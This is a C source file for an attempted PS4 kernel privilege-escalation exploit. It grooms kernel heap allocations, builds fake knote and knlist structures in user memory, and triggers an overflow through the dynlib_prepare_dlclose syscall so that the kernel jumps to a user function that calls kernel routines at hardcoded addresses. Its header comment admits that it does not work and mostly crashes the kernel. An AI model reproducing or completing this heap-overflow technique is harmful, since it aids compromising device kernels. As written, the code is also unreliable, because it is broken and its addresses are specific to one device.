/*
	This does not work, and currently seems to only crash the kernel at times
	(depending on the values chosen)
	I have tried, but not gotten further. Either very close or not at all ... Oo
	(if you figure this out please holla - to discuss you can open an issue)
*/

#include "common.h"
#include "alloc.h"
#include "util.h"

/*
struct knote;
SLIST_HEAD(klist, knote);
struct kqueue;
TAILQ_HEAD(kqlist, kqueue);
struct knlist {
	struct	klist	kl_list;
	void    (*kl_lock)(void *);
	void    (*kl_unlock)(void *);
	void	(*kl_assert_locked)(void *);
	void	(*kl_assert_unlocked)(void *);
	void *kl_lockarg;
};
*/

typedef	__int64_t	sbintime_t;

struct knote {
	SLIST_ENTRY(knote)	kn_link;	/* for kq */
	SLIST_ENTRY(knote)	kn_selnext;	/* for struct selinfo */
	struct			knlist *kn_knlist;	/* f_attach populated */
	TAILQ_ENTRY(knote)	kn_tqe;
	struct			kqueue *kn_kq;	/* which queue we are on */
	struct 			kevent kn_kevent;
	int			kn_status;	/* protected by kq lock */
#define KN_ACTIVE	0x01			/* event has been triggered */
#define KN_QUEUED	0x02			/* event is on queue */
#define KN_DISABLED	0x04			/* event is disabled */
#define KN_DETACHED	0x08			/* knote is detached */
#define KN_INFLUX	0x10			/* knote is in flux */
#define KN_MARKER	0x20			/* ignore this knote */
#define KN_KQUEUE	0x40			/* this knote belongs to a kq */
#define KN_HASKQLOCK	0x80			/* for _inevent */
	int			kn_sfflags;	/* saved filter flags */
	intptr_t		kn_sdata;	/* saved data field */
	union {
		struct		file *p_fp;	/* file data pointer */
		struct		proc *p_proc;	/* proc pointer */
		struct		aiocblist *p_aio;	/* AIO job pointer */
		struct		aioliojob *p_lio;	/* LIO job pointer */
	} kn_ptr;
	struct			filterops *kn_fop;
	void			*kn_hook;
	int			kn_hookid;

#define kn_id		kn_kevent.ident
#define kn_filter	kn_kevent.filter
#define kn_flags	kn_kevent.flags
#define kn_fflags	kn_kevent.fflags
#define kn_data		kn_kevent.data
#define kn_fp		kn_ptr.p_fp
};

// Some good to go stack sizes
#define KExecChunkMax 0x100

// Chunk size controls
#define KExecIntermediateChunkSize 0x8000
#define KExecBufferChunkSize 0x8000
#define KExecOverflowChunkSize 0x8000

// Chunk count control
#define KExecIntermediateChuckCount 100

// Shell signature
typedef void (*Runnable)(void *);

// Arbitrary kernel function signatures
typedef int (*PrintF)(const char *fmt, ...);
typedef int (*SysWrite)(struct thread *, struct write_args *);
typedef int	(*SysSendto)(struct thread *, struct sendto_args *);
typedef int	(*Reboot)(struct thread *, struct reboot_args *);

#ifdef __PS4__
#include <kernel.h>

__typeof__(__mb_sb_limit) __mb_sb_limit;
__typeof__(__mb_sb_limit) *__mb_sb_limit_address;
__typeof__(_CurrentRuneLocale) _CurrentRuneLocale;
__typeof__(_CurrentRuneLocale) *_CurrentRuneLocale_address;
__typeof__(__stdinp) __stdinp;
__typeof__(__stdinp) *__stdinp_address;
__typeof__(__stdoutp) __stdoutp;
__typeof__(__stdoutp) *__stdoutp_address;
__typeof__(__isthreaded) __isthreaded;
__typeof__(__isthreaded) *__isthreaded_address;
#endif

static int debug;

void shell()
{
	while(1)
	{
		printf("shell\n");
		fflush(stdout);
		sleep(1);
	}
}

void run(void *arg) // no idea if this user land function is (can?) ever been called by the kernel
{
	char b[128];
	struct thread *td[32];
	struct sendto_args sargs;
	struct write_args wargs;
	int i;

 	sargs.s = debug;
	sargs.buf = b;
	sargs.len = 4;
 	sargs.flags = 0;
	sargs.to = NULL;
	sargs.tolen = 0;

	wargs.fd = 1;
	wargs.buf = b;
	wargs.nbyte = 4;

	__asm__ volatile("mov %%gs:0, %0" : "=r"(td[0]));
	__asm__ volatile("mov %%gs:1, %0" : "=r"(td[1]));
	__asm__ volatile("mov %%gs:2, %0" : "=r"(td[2]));
	__asm__ volatile("mov %%gs:3, %0" : "=r"(td[3]));
	__asm__ volatile("mov %%gs:4, %0" : "=r"(td[4]));
	__asm__ volatile("mov %%gs:5, %0" : "=r"(td[5]));
	__asm__ volatile("mov %%gs:6, %0" : "=r"(td[6]));
	__asm__ volatile("mov %%gs:7, %0" : "=r"(td[7]));
	__asm__ volatile("mov %%gs:8, %0" : "=r"(td[8]));
	__asm__ volatile("mov %%gs:9, %0" : "=r"(td[9]));
	__asm__ volatile("mov %%gs:10, %0" : "=r"(td[10]));
	__asm__ volatile("mov %%gs:11, %0" : "=r"(td[11]));
	__asm__ volatile("mov %%gs:12, %0" : "=r"(td[12]));
	__asm__ volatile("mov %%gs:13, %0" : "=r"(td[13]));
	__asm__ volatile("mov %%gs:14, %0" : "=r"(td[14]));
	__asm__ volatile("mov %%gs:15, %0" : "=r"(td[15]));


	__asm__ volatile("mov %%gs:16, %0" : "=r"(td[16]));
	__asm__ volatile("mov %%gs:17, %0" : "=r"(td[17]));
	__asm__ volatile("mov %%gs:18, %0" : "=r"(td[18]));
	__asm__ volatile("mov %%gs:19, %0" : "=r"(td[19]));
	__asm__ volatile("mov %%gs:20, %0" : "=r"(td[20]));
	__asm__ volatile("mov %%gs:21, %0" : "=r"(td[21]));
	__asm__ volatile("mov %%gs:22, %0" : "=r"(td[22]));
	__asm__ volatile("mov %%gs:23, %0" : "=r"(td[23]));
	__asm__ volatile("mov %%gs:24, %0" : "=r"(td[24]));
	__asm__ volatile("mov %%gs:25, %0" : "=r"(td[25]));
	__asm__ volatile("mov %%gs:26, %0" : "=r"(td[26]));
	__asm__ volatile("mov %%gs:27, %0" : "=r"(td[27]));
	__asm__ volatile("mov %%gs:28, %0" : "=r"(td[28]));
	__asm__ volatile("mov %%gs:29, %0" : "=r"(td[29]));
	__asm__ volatile("mov %%gs:30, %0" : "=r"(td[30]));
	__asm__ volatile("mov %%gs:31, %0" : "=r"(td[31]));

	while(1)
	{
		b[0] = '0';
		b[2] = ' ';
		b[3] = '\0';
		for(i = 0; i < 32; ++i)
		{
			b[0] = '0' + (i / 10);
			b[1] = '0' + i;
			((SysWrite)0xffffffff8247b0f0)(td[i], &wargs);
			((SysSendto)0xffffffff8249eba0)(td[i], &sargs);
		}
	}
}

void dummy(void *arg) { }

/*
	__asm__ volatile("swapgs;");
	void shell();
//	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
}

	__asm__ volatile("swapgs;");
	printf("bar");
	fflush(stdout);
	while(1){};
	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
*/

void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t bufferSize, size_t overflowSize)
{
	int chunks[KExecChunkMax];
	int bufferChunk;
	int overflowChunk;
	uint8_t *map;
	long pageSize = sysconf(_SC_PAGESIZE);
	size_t mapChunkSize = (bufferSize + overflowSize);
	size_t mapOverflowSize = (0x100000000 + bufferSize) / 4;
	struct klist *kist;
	int i, r;
	int fd = KExecChunkSizeCalulate(intermediateSize);
	struct knote kote = {0};
	struct knlist knist = {0};

/*
	struct knote *kote;
	struct knlist *knist;
	kote = malloc(0x80000); //0x1000 * sizeof(struct knote));
	memset(kote, '\0', 0x80000); //0x1000 * sizeof(struct knote));
	knist = malloc(0x80000); //0x1000 * sizeof(struct knlist));
	memset(knist, '\0', 0x80000); // 0x1000 * sizeof(struct knlist));
*/

	// setup kernel chunks
	for(i = 0; i < intermediateChunkCount; i++)
		chunks[i] = kexecAlloc(intermediateSize);
	// note errors
	for(i = 0; i < intermediateChunkCount; i++)
		if(chunks[i] < 0)
			printf("kexecAlloc: %i failed with %i\n", i, chunks[i]);

	bufferChunk = kexecAlloc(bufferSize);
	if(bufferChunk < 0)
		printf("bufferChunk: failed with %i\n", bufferChunk);

	overflowChunk = kexecAlloc(overflowSize);
	if(overflowChunk < 0)
		printf("overflowChunk: failed with %i\n", overflowChunk);

	// free first
	r = kexecFree(bufferChunk);
	if(r < 0)
		printf("kexecFree(bufferChunk) = %i\n", r);

	// setup userland
	map = mmap(NULL, mapChunkSize + pageSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if(map == MAP_FAILED)
	{
		for(i = 0; i < intermediateChunkCount; i++)
		{
			r = kexecFree(chunks[i]);
			if(r < 0)
				printf("kexecFree(chunks[%i]) = %i\n", i, r);
		}
		r = kexecFree(overflowChunk);
		if(r < 0)
			printf("kexecFree(overflowChunk) = %i\n", r);
		printf("mmap failed\n");
		return;
	}

	munmap(map + mapChunkSize, pageSize);

/*
	i = 0;
	for(kist = (struct klist *)(map + bufferSize); kist < (struct klist *)(map + bufferSize + overflowSize); ++kist)
	{
		knist[i].kl_list.slh_first = NULL;
		knist[i].kl_lock = dummy;
		knist[i].kl_unlock = knist[i].kl_assert_locked = knist[i].kl_assert_unlocked = dummy;
		knist[i].kl_lockarg = NULL;
		kote[i].kn_knlist = &knist[i];
		kist->slh_first = &kote[i];
		++i;
	}
	printf("set %i knotes and knlists\n", i);
*/

	knist.kl_list.slh_first = &kote;

	knist.kl_lock = knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = run;
	knist.kl_lockarg = NULL;

	kote.kn_link.sle_next = NULL;
	kote.kn_selnext.sle_next = NULL;
	kote.kn_knlist = &knist;
	EV_SET(&kote.kn_kevent, fd, EVFILT_READ, EV_ADD, 0, 5, NULL);
	kote.kn_sfflags = kote.kn_kevent.fflags;
	kote.kn_sdata = kote.kn_kevent.data;
	/*kote.kn_kevent.fflags = 0;
	kote.kn_kevent.data = 0;*/

	kist = (struct klist *)(map + bufferSize);
	//for(i = 0; i < overflowSize / sizeof(struct klist); ++i)
	//	kist[i].slh_first = &kote;
	kist[fd].slh_first = &kote;

	// overflow
	r = syscall(SYS_dynlib_prepare_dlclose, 1, map, &mapOverflowSize);
	printf("SYS_dynlib_prepare_dlclose: %i\n", r);

	printf("wait ... ");
	sleep(0);
	printf("go\n");
	fflush(stdout);
	sleep(2);

/*
	// free all intermediates - unless global fd - nothing happens here
	for(i = 0; i < intermediateChunkCount; i++)
	{
		printf("freeing: %i\n", i);
		fflush(stdout);
		r = kexecFree(chunks[i]);
		if(r < 0)
			printf("kexecFree(chunks[%i]) = %i\n", i, r);
	}

	printf("wait ... ");
	sleep(10);
	printf("go\n");
	fflush(stdout);
	sleep(1);
*/

	printf("Pre Trigger\n");
	fflush(stdout);
	// trigger + free
	//sceKernelCreateEqueue(&overflowChunk, "kexec");
	sceKernelAddReadEvent(overflowChunk, kexecGetGlobalFileDescriptor(), 5, NULL);


	//r = kexecFree(overflowChunk);
	if(r < 0)
		printf("kexecFree(overflowChunk) = %i\n", r);
	printf("Post Trigger\n");
	fflush(stdout);

/*
	munmap(map, bufferSize); // mapChunkSize - overflowSize

	// close fd for unclosed global allocs
	r = kexecCloseGlobalIfNeeded();
	if(r < 0)
		printf("kexecCloseGlobalIfNeeded() = %i\n", r);
*/
}

int main(int argc, char **argv)
{
	#ifdef __PS4__
	int libc = sceKernelLoadStartModule("libSceLibcInternal.sprx", 0, NULL, 0, 0, 0);
	sceKernelDlsym(libc, "__stdoutp", (void **)&__stdoutp_address);
	__stdoutp = *__stdoutp_address;
	sceKernelDlsym(libc, "__mb_sb_limit", (void **)&__mb_sb_limit_address);
	__mb_sb_limit = *__mb_sb_limit_address;
	sceKernelDlsym(libc, "_CurrentRuneLocale", (void **)&_CurrentRuneLocale_address);
	_CurrentRuneLocale = *_CurrentRuneLocale_address;
	#endif

	debug = utilSingleAcceptServer(5088);

	kexecExploit(KExecIntermediateChuckCount, KExecIntermediateChunkSize, KExecBufferChunkSize, KExecOverflowChunkSize);

	while(1);

	close(debug);

	return EXIT_SUCCESS;
}
